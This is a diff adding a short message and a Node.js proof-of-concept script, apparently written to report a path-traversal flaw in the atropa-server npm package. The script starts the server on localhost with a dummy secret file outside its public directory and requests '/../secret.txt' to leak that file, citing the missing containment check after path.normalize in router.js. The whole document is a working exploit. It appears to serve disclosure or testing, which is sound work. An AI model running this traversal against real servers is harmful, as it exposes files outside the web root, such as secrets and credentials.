@@ -1,0 +1,39 @@
+Verified end-to-end from the working directory using a relative `require`. Here's the exploit:
+
+```javascript
+var path = require("path");
+var http = require("http");
+var os = require("os");
+var fs = require("fs");
+var atropaServer = require("./node_modules/atropa-server");
+
+// Set up a "public" directory that the server is meant to expose, and a
+// secret file OUTSIDE of it that must not be reachable via the web server.
+var tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "atropa-poc-"));
+var publicRoot = path.join(tmpRoot, "public");
+fs.mkdirSync(publicRoot);
+fs.writeFileSync(path.join(tmpRoot, "secret.txt"), "TOP-SECRET-DATA-12345\n");
+
+atropaServer.start(8899, publicRoot);
+
+setTimeout(function () {
+    // router.js builds: path.normalize(serverroot + '/' + pathname)
+    // with no check that the result stays inside serverroot, so ../
+    // segments escape the intended public directory (path traversal).
+    var req = http.request({
+        host: "127.0.0.1",
+        port: 8899,
+        path: "/../secret.txt",
+        method: "GET"
+    }, function (res) {
+        var data = "";
+        res.on("data", function (chunk) { data += chunk; });
+        res.on("end", function () {
+            console.log("Response status:", res.statusCode);
+            console.log("Leaked file contents:", JSON.stringify(data));
+            process.exit(0);
+        });
+    });
+    req.end();
+}, 500);
+```
